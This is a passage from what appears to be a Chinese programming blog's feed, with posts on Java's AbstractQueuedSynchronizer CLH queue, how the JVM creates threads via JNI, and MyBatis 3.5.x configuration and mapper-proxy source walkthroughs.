class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isSignalled</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> getState() != <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> ignore)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> isSignalled() ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryReleaseShared</span><span class="params">(<span class="keyword">int</span> ignore)</span> </span>&#123;</span><br><span class="line">      setState(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Sync sync = <span class="keyword">new</span> Sync();</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSignalled</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> sync.isSignalled(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">signal</span><span class="params">()</span>         </span>&#123; sync.releaseShared(<span class="number">1</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">await</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">     sync.acquireSharedInterruptibly(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AbstractQueuedSynchronizer.Node</p>
<p>等待队列节点类。</p>
<p>等待队列是“ CLH”（Craig，Landin和Hagersten）锁定队列的变体。 CLH锁通常用于自旋锁。相反，我们将它们用于阻塞同步器，但是使用相同的基本策略，将有关线程的某些控制信息保存在其节点的前身中。每个节点中的“状态”字段将跟踪线程是否应阻塞。节点的前任释放时会发出信号。否则，队列的每个节点都充当一个特定通知样式的监视器，其中包含一个等待线程。虽然状态字段不控制是否授予线程锁等。线程可能会尝试获取它是否在队列中的第一位。但是先行并不能保证成功。它只赋予了抗辩的权利。因此，当前发布的竞争者线程可能需要重新等待。</p>
<p>要加入CLH锁，您可以自动将其作为新尾部拼接。要出队，您只需设置头字段。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     +------+  prev +-----+       +-----+</span><br><span class="line">head |      | &lt;---- |     | &lt;---- |     |  tail</span><br><span class="line">     +------+       +-----+       +-----+</span><br></pre></td></tr></table></figure>
<p>插入到CLH队列中只需要对“尾巴”执行一次原子操作，因此存在一个简单的原子分界点，即从未排队到排队。同样，出队仅涉及更新“头”。但是，节点需要花费更多的精力来确定其后继者是谁，部分原因是要处理由于超时和中断而可能导致的取消。</p>
<p>“ prev”链接（在原始CLH锁中不使用）主要用于处理取消。如果取消某个节点，则其后继节点（通常）会重新链接到未取消的前任节点。有关自旋锁情况下类似机制的说明，请参见Scott和Scherer的论文，网址为<a href="http://www.cs.rochester.edu/u/scott/synchronization/" target="_blank" rel="noopener">http://www.cs.rochester.edu/u/scott/synchronization/</a></p>
<p>我们还使用“next”链接来实现阻止机制。每个节点的线程ID保留在其自己的节点中，因此前任通过遍历下一个链接以确定它是哪个线程，从而通知下一个节点唤醒。确定后继者必须避免与新排队的节点竞争以设置其前任节点的“ next”字段。如果需要，可以通过在节点的后继者为空时从原子更新的“tail”向后检查来解决此问题。 （或者换句话说，next链接是一种优化，因此我们通常不需要向后扫描。）</p>
<p>取消将一些保守性引入到基本算法中。由于我们必须轮询其他节点的取消，因此我们可能会遗漏没有注意到已取消的节点在我们前面还是后面。要解决此问题，必须始终在取消时取消后继者，使他们能够稳定在新的前任者身上，除非我们能确定一个未取消的前任者将承担这一责任。</p>
<p>CLH队列需要一个虚拟标头节点才能开始。但是，我们不会在构建过程中创建它们，因为如果没有争执，那将是浪费时间。取而代之的是，构造节点，并在第一次争用时设置头和尾指针。</p>
<p>等待条件的线程使用相同的节点，但使用附加链接。条件只需要在简单（非并行）链接队列中链接节点，因为仅当它们专用时才可以访问它们。等待时，将节点插入条件队列。收到信号后，该节点将转移到主队列。状态字段的特殊值用于标记节点所在的队列。</p>
<p>感谢Dave Dice，Mark Moir，Victor Luchangco，Bill Scherer和Michael Scott以及JSR-166专家组的成员，对此类的设计提出了有益的想法，讨论和批评。</p>
<p>未完待续…</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> synchronize </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JVM如何创建线程]]></title>
      <url>/2020/jvm-create-thread/</url>
      <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">t.start();</span><br></pre></td></tr></table></figure>
<p>上面这段代码在JVM中是如何实现的呢？</p>
<a id="more"></a>
<ol>
<li>我们需要熟悉<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html" target="_blank" rel="noopener">JNI</a></li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/afc434bdgy1geyttoog76j20oy09nt9a.jpg" alt="image"></p>
<ol>
<li><p>打开Thread.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Thread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* Make sure registerNatives is the first thing &lt;clinit&gt; does. */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">registerNatives</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        registerNatives();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>了解过JNI，那么我们知道Thread.java一定会对应一个c或c++文件，那么在JVM中Thread.java对应的C文件是<code>openjdk-jdk8u-jdk8u\jdk\src\share\native\java\lang\Thread.c</code></p>
<p>打开Thread.c，发现这个文件很简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jni.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jvm.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"java_lang_Thread.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THD <span class="meta-string">"Ljava/lang/Thread;"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJ <span class="meta-string">"Ljava/lang/Object;"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STE <span class="meta-string">"Ljava/lang/StackTraceElement;"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STR <span class="meta-string">"Ljava/lang/String;"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAY_LENGTH(a) (sizeof(a)/sizeof(a[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> JNINativeMethod methods[] = &#123;</span><br><span class="line">    &#123;<span class="string">"start0"</span>,           <span class="string">"()V"</span>,        (<span class="keyword">void</span> *)&amp;JVM_StartThread&#125;,</span><br><span class="line">    &#123;<span class="string">"stop0"</span>,            <span class="string">"("</span> OBJ <span class="string">")V"</span>, (<span class="keyword">void</span> *)&amp;JVM_StopThread&#125;,</span><br><span class="line">    &#123;<span class="string">"isAlive"</span>,          <span class="string">"()Z"</span>,        (<span class="keyword">void</span> *)&amp;JVM_IsThreadAlive&#125;,</span><br><span class="line">    &#123;<span class="string">"suspend0"</span>,         <span class="string">"()V"</span>,        (<span class="keyword">void</span> *)&amp;JVM_SuspendThread&#125;,</span><br><span class="line">    &#123;<span class="string">"resume0"</span>,          <span class="string">"()V"</span>,        (<span class="keyword">void</span> *)&amp;JVM_ResumeThread&#125;,</span><br><span class="line">    &#123;<span class="string">"setPriority0"</span>,     <span class="string">"(I)V"</span>,       (<span class="keyword">void</span> *)&amp;JVM_SetThreadPriority&#125;,</span><br><span class="line">    &#123;<span class="string">"yield"</span>,            <span class="string">"()V"</span>,        (<span class="keyword">void</span> *)&amp;JVM_Yield&#125;,</span><br><span class="line">    &#123;<span class="string">"sleep"</span>,            <span class="string">"(J)V"</span>,       (<span class="keyword">void</span> *)&amp;JVM_Sleep&#125;,</span><br><span class="line">    &#123;<span class="string">"currentThread"</span>,    <span class="string">"()"</span> THD,     (<span class="keyword">void</span> *)&amp;JVM_CurrentThread&#125;,</span><br><span class="line">    &#123;<span class="string">"countStackFrames"</span>, <span class="string">"()I"</span>,        (<span class="keyword">void</span> *)&amp;JVM_CountStackFrames&#125;,</span><br><span class="line">    &#123;<span class="string">"interrupt0"</span>,       <span class="string">"()V"</span>,        (<span class="keyword">void</span> *)&amp;JVM_Interrupt&#125;,</span><br><span class="line">    &#123;<span class="string">"isInterrupted"</span>,    <span class="string">"(Z)Z"</span>,       (<span class="keyword">void</span> *)&amp;JVM_IsInterrupted&#125;,</span><br><span class="line">    &#123;<span class="string">"holdsLock"</span>,        <span class="string">"("</span> OBJ <span class="string">")Z"</span>, (<span class="keyword">void</span> *)&amp;JVM_HoldsLock&#125;,</span><br><span class="line">    &#123;<span class="string">"getThreads"</span>,        <span class="string">"()["</span> THD,   (<span class="keyword">void</span> *)&amp;JVM_GetAllThreads&#125;,</span><br><span class="line">    &#123;<span class="string">"dumpThreads"</span>,      <span class="string">"(["</span> THD <span class="string">")[["</span> STE, (<span class="keyword">void</span> *)&amp;JVM_DumpThreads&#125;,</span><br><span class="line">    &#123;<span class="string">"setNativeName"</span>,    <span class="string">"("</span> STR <span class="string">")V"</span>, (<span class="keyword">void</span> *)&amp;JVM_SetNativeThreadName&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> THD</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> OBJ</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> STE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> STR</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line">Java_java_lang_Thread_registerNatives(JNIEnv *env, jclass cls)</span><br><span class="line">&#123;</span><br><span class="line">    (*env)-&gt;RegisterNatives(env, cls, methods, ARRAY_LENGTH(methods));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到methods定义了所有的native方法。Java_java_lang_Thread_registerNatives恰好对应的是java.lang.Thread中的registerNatives()方法。</p>
<p>当执行t.start()的时候，发生了什么呢？</p>
<p>我们知道在执行t.start()的时候，jdk代码中会去执行start0的native方法那么对应的就是JVM_StartThread。</p>
<p>我们找到JVM_StartThread</p>
<p><code>openjdk-jdk8u-jdk8u\hotspot\src\share\vm\prims\jvm.h</code></p>
<p><code>openjdk-jdk8u-jdk8u\hotspot\src\share\vm\prims\jvm.cpp</code></p>
<p>在C/C++中.h .hpp文件为头文件，可以理解为啥呢，Java中的接口文件（类似哈，请不要较真）</p>
<p>.c .cpp为具体的实现文件。</p>
<p>在jvm.cpp找到JVM_ENTRY(void, JVM_StartThread(JNIEnv* env, jobject jthread))创建线程的入口。</p>
<p><img src="https://tva2.sinaimg.cn/large/afc434bdgy1gf1aul792kj20nv0o4whm.jpg" alt="image"></p>
<p>其中第6步的new JavaThread在<code>openjdk-jdk8u-jdk8u\hotspot\src\share\vm\runtime\thread.cpp</code></p>
<p><code>JavaThread::JavaThread(ThreadFunction entry_point, size_t stack_sz)</code></p>
<p>在调用pthread_create的时候，这里涉及到具体的操作系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">openjdk-jdk8u-jdk8u\hotspot\src\os\linux\vm\os_linux.cpp</span><br><span class="line">windows:</span><br><span class="line">openjdk-jdk8u-jdk8u\hotspot\src\os\windows\vm\os_windows.cpp</span><br><span class="line">bsd:</span><br><span class="line">openjdk-jdk8u-jdk8u\hotspot\src\os\bsd\vm\os_bsd.cpp</span><br><span class="line">aix:</span><br><span class="line">openjdk-jdk8u-jdk8u\hotspot\src\os\aix\vm\os_aix.cpp</span><br><span class="line">solaris:</span><br><span class="line">openjdk-jdk8u-jdk8u\hotspot\src\os\solaris\vm\os_solaris.cpp</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> jvm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mybatis 3.5.x源码系列（2）]]></title>
      <url>/2020/mybatis-source-02/</url>
      <content type="html"><![CDATA[<p>接着上一篇<a href="/2020/mybatis-source-01">mybatis 3.5.x源码系列（1）</a> 我们继续研究一下mybatis的配置读取<br><a id="more"></a></p>
<h1 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h1><p>上一篇我们讲到了xml解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.builder.xml.XMLConfigBuilder#parseConfiguration(org.apache.ibatis.parsing.XNode root)</span><br></pre></td></tr></table></figure></p>
<p>这里我们来看看这个方法中的第一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.builder.xml.XMLConfigBuilder#propertiesElement(org.apache.ibatis.parsing.XNode context)</span><br></pre></td></tr></table></figure></p>
<p>可以看到propertiesElement接收的参数是root.evalNode(“properties”)</p>
<p>那么我们看看properties是如何编写？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties resource=&quot;org/mybatis/example/config.properties&quot;&gt;</span><br><span class="line">  &lt;property name=&quot;username&quot; value=&quot;dev_user&quot;/&gt;</span><br><span class="line">  &lt;property name=&quot;password&quot; value=&quot;F2Fa3!33TYyg&quot;/&gt;</span><br><span class="line">&lt;/properties&gt;</span><br></pre></td></tr></table></figure></p>
<p>实际上在properties上有两个属性 resource和url，但是这两个属性不能同时使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String resource = context.getStringAttribute(&quot;resource&quot;);</span><br><span class="line">String url = context.getStringAttribute(&quot;url&quot;);</span><br><span class="line">if (resource != null &amp;&amp; url != null) &#123;</span><br><span class="line">    throw new BuilderException(&quot;The properties element cannot specify both a URL and a resource based property file reference.  Please specify one or the other.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="resource"><a href="#resource" class="headerlink" title="resource"></a>resource</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.io.Resources#getResourceAsProperties(java.lang.String)</span><br><span class="line">  》org.apache.ibatis.io.ClassLoaderWrapper#getResourceAsStream(java.lang.String, java.lang.ClassLoader)</span><br><span class="line">    》org.apache.ibatis.io.ClassLoaderWrapper#getClassLoaders(java.lang.ClassLoader)</span><br><span class="line">    》org.apache.ibatis.io.ClassLoaderWrapper#getResourceAsStream(java.lang.String, java.lang.ClassLoader[])</span><br></pre></td></tr></table></figure>
<p>这里会分别从<code>classLoader</code>, <code>defaultClassLoader</code>, <code>Thread.currentThread().getContextClassLoader()</code>, <code>getClass().getClassLoader()</code>, <code>ClassLoader.getSystemClassLoader()</code>加载resource指定的properties文件</p>
<p>一般情况下：<code>Thread.currentThread().getContextClassLoader()</code>，<code>getClass().getClassLoader()</code>，<code>ClassLoader.getSystemClassLoader()</code>都是<code>Launcher$AppClassLoader</code></p>
<h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.io.Resources#getUrlAsProperties(java.lang.String)</span><br><span class="line">  》org.apache.ibatis.io.Resources#getUrlAsStream(java.lang.String)</span><br></pre></td></tr></table></figure>
<p>url的加载就比较简单了，采用的java.net.URL#openConnection()的方式加载配置文件<br>jdk的URL有这些：http(s), jar, file, ftp等等，具体的就是java.net.URLConnection的实现类</p>
<p>无论是resource加载还是url加载，最终加载到配置文件后，把所有解析到的值存放到mybatis默认的defaults properties中</p>
<h1 id="settings-typeAliases-typeHandlers-objectFactory"><a href="#settings-typeAliases-typeHandlers-objectFactory" class="headerlink" title="settings, typeAliases, typeHandlers, objectFactory"></a>settings, typeAliases, typeHandlers, objectFactory</h1><p>如何使用，大家可以看看<a href="https://mybatis.org/mybatis-3/zh/configuration.html#settings" target="_blank">settings</a><br><a href="https://mybatis.org/mybatis-3/zh/configuration.html#typeAliases" target="_blank">typeAliases</a><br><a href="https://mybatis.org/mybatis-3/zh/configuration.html#typeHandlers" target="_blank">typeHandlers</a><br><a href="https://mybatis.org/mybatis-3/zh/configuration.html#objectFactory" target="_blank">objectFactory</a></p>
<p>好了，下次见。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> mybatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mybatis3.5.x源码系列（1）]]></title>
      <url>/2020/mybatis-source-01/</url>
      <content type="html"><![CDATA[<ol>
<li>首先我们了解一下mybatis中的几个核心概念</li>
</ol>
<ul>
<li>Configuration 配置，可以理解为mybatis的大管家，管理一切</li>
<li>Environment 环境，这个主要负责数据源，事务管理器</li>
<li>MappedStatement mapper.xml对应的声明类，定义mapper中所有的标签，属性</li>
<li>Interceptor 拦截器，可以拦截Executor，ParameterHandler，ResultSetHandler，StatementHandler</li>
<li>SqlSessionFactory SQL会话管理工厂类</li>
<li>SqlSession SQL会话，定义了增，删，改，查，提交，回滚，获取java.sql.Connection，获取mapper</li>
<li>MapperProxy mapper代理类，生成接口代理对象</li>
<li>Executor 执行器，主要负责增，删，改，查，提交，回滚的执行</li>
<li>ParameterHandler 参数处理器，主要负责参数设置</li>
<li>ResultSetHandler 查询结果集处理器，用来封装ResultSet对应的结果</li>
<li>StatementHandler Statement处理器，用来执行Statement相应的操作</li>
</ul>
<a id="more"></a>
<p>带着上面的概念，我们开始我们的源码分析入门之旅</p>
<ol>
<li>首先我们要看看官方demo 打开<a href="https://mybatis.org/mybatis-3/zh/getting-started.html" target="_blank" rel="noopener">mybatis-3-getting-started</a></li>
</ol>
<p>例子：</p>
<p>代码结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">  main</span><br><span class="line">    test</span><br><span class="line">      java</span><br><span class="line">        io.jsbxyyx</span><br><span class="line">          mapper</span><br><span class="line">            Blog.java</span><br><span class="line">            BlogMapper.java</span><br><span class="line">            BlogMapper.xml</span><br><span class="line">          Demo.java</span><br><span class="line">          mybatis-config.xml</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    String resource = &quot;io/jsbxyyx/mybatis-config.xml&quot;;</span><br><span class="line">    InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">    BlogMapper blogMapper = sqlSessionFactory.openSession().getMapper(BlogMapper.class);</span><br><span class="line">    Blog blog = blogMapper.selectBlog(1L);</span><br><span class="line">    System.out.println(blog);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="XML创建SqlSessionFactory"><a href="#XML创建SqlSessionFactory" class="headerlink" title="XML创建SqlSessionFactory"></a>XML创建SqlSessionFactory</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.session.SqlSessionFactoryBuilder#build(java.io.InputStream, java.lang.String, java.util.Properties)</span><br><span class="line">  》org.apache.ibatis.builder.xml.XMLConfigBuilder#parse()</span><br><span class="line">    》org.apache.ibatis.builder.xml.XMLConfigBuilder#parseConfiguration(org.apache.ibatis.parsing.XNode root)</span><br><span class="line">  》org.apache.ibatis.session.SqlSessionFactoryBuilder#build(org.apache.ibatis.session.Configuration)</span><br></pre></td></tr></table></figure>
<h3 id="核心方法org-apache-ibatis-builder-xml-XMLConfigBuilder-parseConfiguration"><a href="#核心方法org-apache-ibatis-builder-xml-XMLConfigBuilder-parseConfiguration" class="headerlink" title="核心方法org.apache.ibatis.builder.xml.XMLConfigBuilder#parseConfiguration"></a>核心方法org.apache.ibatis.builder.xml.XMLConfigBuilder#parseConfiguration</h3><p>该方法会解析出properties，settings，typeAliases，plugins，objectFactory，objectWrapperFactory，reflectorFactory，environments，databaseIdProvider，typeHandlers，mappers</p>
<h3 id="解析mappers"><a href="#解析mappers" class="headerlink" title="解析mappers"></a>解析mappers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 这里解析mappers下的package标签，也就是包扫描，以及mapper标签</span><br><span class="line">org.apache.ibatis.builder.xml.XMLConfigBuilder#mapperElement(org.apache.ibatis.parsing.XNode parent)</span><br><span class="line">  》org.apache.ibatis.builder.xml.XMLStatementBuilder#parseStatementNode</span><br><span class="line">    》org.apache.ibatis.builder.MapperBuilderAssistant#addMappedStatement</span><br></pre></td></tr></table></figure>
<p>解析mappers，创建MappedStatement并缓存到内存</p>
<h2 id="打开session"><a href="#打开session" class="headerlink" title="打开session"></a>打开session</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.session.defaults.DefaultSqlSessionFactory#openSession()</span><br><span class="line">  》org.apache.ibatis.session.Configuration#getDefaultExecutorType()</span><br><span class="line">  》org.apache.ibatis.session.defaults.DefaultSqlSessionFactory#openSessionFromDataSource(org.apache.ibatis.session.ExecutorType execType, org.apache.ibatis.session.TransactionIsolationLevel level, boolean autoCommit)</span><br><span class="line">    》org.apache.ibatis.session.defaults.DefaultSqlSessionFactory#getTransactionFactoryFromEnvironment(org.apache.ibatis.mapping.Environment)</span><br><span class="line">  》org.apache.ibatis.transaction.TransactionFactory#newTransaction(javax.sql.DataSource, org.apache.ibatis.session.TransactionIsolationLevel, boolean)</span><br><span class="line">    》org.apache.ibatis.transaction.jdbc.JdbcTransaction#JdbcTransaction(javax.sql.DataSource, org.apache.ibatis.session.TransactionIsolationLevel, boolean)</span><br><span class="line">  》org.apache.ibatis.session.Configuration#newExecutor(org.apache.ibatis.transaction.Transaction, org.apache.ibatis.session.ExecutorType)</span><br><span class="line">  》org.apache.ibatis.session.defaults.DefaultSqlSession#DefaultSqlSession(org.apache.ibatis.session.Configuration, org.apache.ibatis.executor.Executor, boolean)</span><br></pre></td></tr></table></figure>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>获取数据源 =》开启事务 =》获取执行器 =》创建SqlSession</p>
<h2 id="获取Mapper"><a href="#获取Mapper" class="headerlink" title="获取Mapper"></a>获取Mapper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.ibatis.session.Configuration#getMapper(java.lang.Class&lt;T&gt;, org.apache.ibatis.session.SqlSession)</span><br><span class="line">    》org.apache.ibatis.binding.MapperRegistry#getMapper(java.lang.Class&lt;T&gt;, org.apache.ibatis.session.SqlSession)</span><br><span class="line">      》org.apache.ibatis.binding.MapperProxyFactory#newInstance(org.apache.ibatis.session.SqlSession)</span><br><span class="line">        》java.lang.reflect.Proxy#newProxyInstance(java.lang.ClassLoader loader, java.lang.Class&lt;?&gt;[] interfaces, java.lang.reflect.InvocationHandler h)</span><br></pre></td></tr></table></figure>
<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p>根据接口class =》创建JDK动态代理对象org.apache.ibatis.binding.MapperProxy（这就是为啥mybatis的mapper定义是接口的原因）</p>
<h2 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">io.jsbxyyx.mapper.BlogMapper#selectBlog</span><br><span class="line">  》org.apache.ibatis.binding.MapperProxy#invoke</span><br><span class="line">    》org.apache.ibatis.binding.MapperProxy#cachedInvoker</span><br><span class="line">      》org.apache.ibatis.binding.MapperMethod#MapperMethod(java.lang.Class&lt;?&gt; mapperInterface, java.lang.reflect.Method method, org.apache.ibatis.session.Configuration config)</span><br><span class="line">      》org.apache.ibatis.binding.MapperProxy.PlainMethodInvoker#invoke</span><br><span class="line">        》org.apache.ibatis.binding.MapperMethod#execute(org.apache.ibatis.session.SqlSession, java.lang.Object[] args)</span><br><span class="line">          》org.apache.ibatis.session.Configuration#getMappedStatement(java.lang.String statement)</span><br><span class="line">          》org.apache.ibatis.executor.Executor#query(org.apache.ibatis.mapping.MappedStatement, java.lang.Object, org.apache.ibatis.session.RowBounds, org.apache.ibatis.session.ResultHandler)</span><br><span class="line">            》org.apache.ibatis.executor.CachingExecutor#createCacheKey(org.apache.ibatis.mapping.MappedStatement, java.lang.Object parameterObject, org.apache.ibatis.session.RowBounds, org.apache.ibatis.mapping.BoundSql)</span><br><span class="line">              